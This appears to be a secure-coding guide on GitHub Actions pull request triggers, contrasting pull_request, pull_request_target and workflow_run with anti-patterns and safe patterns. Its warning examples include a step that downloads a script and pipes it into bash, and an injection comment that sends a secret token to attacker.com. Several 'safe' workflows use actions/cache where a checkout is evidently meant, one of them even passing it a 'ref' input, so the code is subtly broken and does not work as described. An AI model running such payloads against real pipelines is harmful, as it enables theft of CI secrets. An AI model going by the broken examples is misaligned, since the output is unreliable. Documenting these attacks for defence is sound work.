# Pull Request Security

Understanding the security implications of pull request workflows is critical for public repositories that accept contributions from forks.

## Trigger Types Comparison

### `pull_request` (Safe Default)

**Security context:**
- Runs with read-only `GITHUB_TOKEN`
- Executes code from the PR branch
- No access to repository secrets (for forked PRs)
- Cannot write to repository or make comments

**Use when:**
- Running tests and builds
- Linting and code quality checks
- Security scanning
- Any automated checks on untrusted code

```yaml
name: CI

on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ${{ vars.DEFAULT_DEV_UBUNTU_RUNNER }}
    steps:
      - uses: actions/cache@cdf6c1fa76f9f475f3d7449005a359c84ca0f306 # v5.0.3
      - run: npm ci
      - run: npm test
```

### `pull_request_target` (Dangerous)

**Security context:**
- Runs with write permissions to `GITHUB_TOKEN`
- Executes code from the **base branch**, not PR
- **Has access to repository secrets**
- Can write to repository and make comments

**Danger:**
If you checkout PR code, malicious PRs can:
- Exfiltrate secrets
- Modify repository contents
- Escalate privileges
- Execute arbitrary code with repository permissions

**Use ONLY when:**
- You need to comment on PRs from forks
- You **never** checkout untrusted code
- You carefully validate any PR data before using it

```yaml
name: Comment on PR

on:
  pull_request_target:
    types: [opened]

jobs:
  comment:
    runs-on: ${{ vars.DEFAULT_DEV_UBUNTU_RUNNER }}
    steps:
      # SAFE: Does NOT checkout PR code
      - name: Welcome comment
        uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd  # v8.0.0
        with:
          script: |
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: 'Thanks for contributing! 🎉'
            })
```

### `workflow_run` (Safe Alternative)

**Security context:**
- Triggered after another workflow completes
- Runs with write permissions
- Does NOT execute PR code
- Can access artifacts from triggering workflow

**Use when:**
- Need to comment/label PRs after tests pass
- Want to process test results safely
- Need write access but don't want to expose secrets

```yaml
# Workflow 1: Run tests (runs on pull_request)
name: Tests

on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ${{ vars.DEFAULT_DEV_UBUNTU_RUNNER }}
    steps:
      - uses: actions/cache@cdf6c1fa76f9f475f3d7449005a359c84ca0f306 # v5.0.3
      - run: npm test
      - name: Upload test results
        uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f  # v6.0.0
        with:
          name: test-results
          path: test-results.json
```

```yaml
# Workflow 2: Comment with results (runs on workflow_run)
name: Comment Test Results

on:
  workflow_run:
    workflows: ["Tests"]
    types: [completed]

jobs:
  comment:
    runs-on: ${{ vars.DEFAULT_DEV_UBUNTU_RUNNER }}
    steps:
      - name: Download test results
        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131  # v7.0.0
        with:
          name: test-results

      - name: Comment results
        uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd  # v8.0.0
        with:
          script: |
            const results = require('./test-results.json');
            github.rest.issues.createComment({
              issue_number: context.payload.workflow_run.pull_requests[0].number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: `Tests ${results.passed ? '✅ passed' : '❌ failed'}`
            })
```

## Common Vulnerability Patterns

### ❌ Anti-Pattern 1: Checking out PR code with pull_request_target

**NEVER DO THIS:**

```yaml
on: pull_request_target

jobs:
  dangerous:
    runs-on: ${{ vars.DEFAULT_DEV_UBUNTU_RUNNER }}
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.1
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS!
      - run: npm install  # Arbitrary code execution via package.json scripts
      - run: npm test     # Can access secrets and exfiltrate them
```

**Why it's dangerous:**
- Attacker creates PR with malicious `package.json` scripts
- Workflow checks out their code with write permissions
- Scripts run with access to secrets
- Attacker exfiltrates secrets or modifies repository

### ❌ Anti-Pattern 2: Running untrusted scripts

**NEVER DO THIS:**

```yaml
on: pull_request_target

jobs:
  dangerous:
    steps:
      - name: Run PR script
        run: |
          curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
            "${{ github.event.pull_request.head.repo.url }}/contents/script.sh" \
            | jq -r '.content' | base64 -d | bash  # EXTREMELY DANGEROUS!
```

### ❌ Anti-Pattern 3: Script injection from issue titles/comments

**NEVER DO THIS:**

```yaml
on:
  issue_comment:
    types: [created]

jobs:
  dangerous:
    steps:
      - name: Process comment
        run: |
          echo "Comment: ${{ github.event.comment.body }}"  # Injection risk!
          # Attacker can inject: "; curl attacker.com?token=$SECRET
```

**DO THIS INSTEAD:**

```yaml
on:
  issue_comment:
    types: [created]

jobs:
  safe:
    steps:
      - name: Process comment
        env:
          COMMENT_BODY: ${{ github.event.comment.body }}
        run: |
          echo "Comment: $COMMENT_BODY"  # Safe: uses environment variable
```

## Safe Patterns for Common Use Cases

### Pattern 1: Label PRs Based on Tests

**Approach: Use workflow_run**

```yaml
# tests.yml (runs on pull_request - safe)
name: Tests
on: pull_request

jobs:
  test:
    runs-on: ${{ vars.DEFAULT_DEV_UBUNTU_RUNNER }}
    steps:
      - uses: actions/cache@cdf6c1fa76f9f475f3d7449005a359c84ca0f306 # v5.0.3
      - run: npm test
```

```yaml
# label.yml (runs on workflow_run - has write access)
name: Label PR
on:
  workflow_run:
    workflows: ["Tests"]
    types: [completed]

jobs:
  label:
    runs-on: ${{ vars.DEFAULT_DEV_UBUNTU_RUNNER }}
    permissions:
      pull-requests: write
    steps:
      - uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd  # v8.0.0
        with:
          script: |
            if (context.payload.workflow_run.conclusion === 'success') {
              github.rest.issues.addLabels({
                owner: context.repo.owner,
                repo: context.repo.repo,
                issue_number: context.payload.workflow_run.pull_requests[0].number,
                labels: ['tests-passed']
              });
            }
```

### Pattern 2: Post Coverage Reports

**Approach: Upload artifact, then process safely**

```yaml
# coverage.yml
name: Coverage
on: pull_request

jobs:
  coverage:
    runs-on: ${{ vars.DEFAULT_DEV_UBUNTU_RUNNER }}
    steps:
      - uses: actions/cache@cdf6c1fa76f9f475f3d7449005a359c84ca0f306 # v5.0.3
      - run: npm run coverage
      - uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f  # v6.0.0
        with:
          name: coverage-report
          path: coverage/coverage-summary.json
```

```yaml
# comment-coverage.yml
name: Comment Coverage
on:
  workflow_run:
    workflows: ["Coverage"]
    types: [completed]

jobs:
  comment:
    runs-on: ${{ vars.DEFAULT_DEV_UBUNTU_RUNNER }}
    permissions:
      pull-requests: write
    steps:
      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131  # v7.0.0
        with:
          name: coverage-report

      - uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd  # v8.0.0
        with:
          script: |
            const coverage = require('./coverage-summary.json');
            const pct = coverage.total.lines.pct;
            github.rest.issues.createComment({
              issue_number: context.payload.workflow_run.pull_requests[0].number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: `## Coverage Report\n\nLine coverage: ${pct}%`
            });
```

### Pattern 3: Validate External PRs Before Running

**Approach: Require manual approval for first-time contributors**

1. Enable "Require approval for first-time contributors" in Settings → Actions
2. Maintainers approve workflows for each new contributor
3. Subsequent PRs from approved contributors run automatically

**Or use environment protection:**

```yaml
name: Deploy Staging
on: pull_request_target

jobs:
  deploy:
    runs-on: ${{ vars.DEFAULT_DEV_UBUNTU_RUNNER }}
    environment: staging  # Requires approval
    steps:
      - uses: actions/cache@cdf6c1fa76f9f475f3d7449005a359c84ca0f306 # v5.0.3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      # Safe because manual approval gates this
      - run: ./deploy-staging.sh
```

## Security Checklist for PR Workflows

- [ ] Use `pull_request` by default, not `pull_request_target`
- [ ] If using `pull_request_target`, never checkout PR code
- [ ] Pass untrusted input through environment variables, not inline
- [ ] Review third-party actions that run on PRs
- [ ] Enable "Require approval for first-time contributors"
- [ ] Use `workflow_run` pattern for commenting on PRs
- [ ] Never expose secrets to untrusted code
- [ ] Validate and sanitize all user input from PR events
- [ ] Use environment protection for sensitive workflows
- [ ] Audit workflows regularly for security issues

## Additional Resources

- [GitHub Security Lab: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [Understanding workflow_run](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run)
- [Approving workflow runs from forks](https://docs.github.com/en/actions/managing-workflow-runs/approving-workflow-runs-from-public-forks)
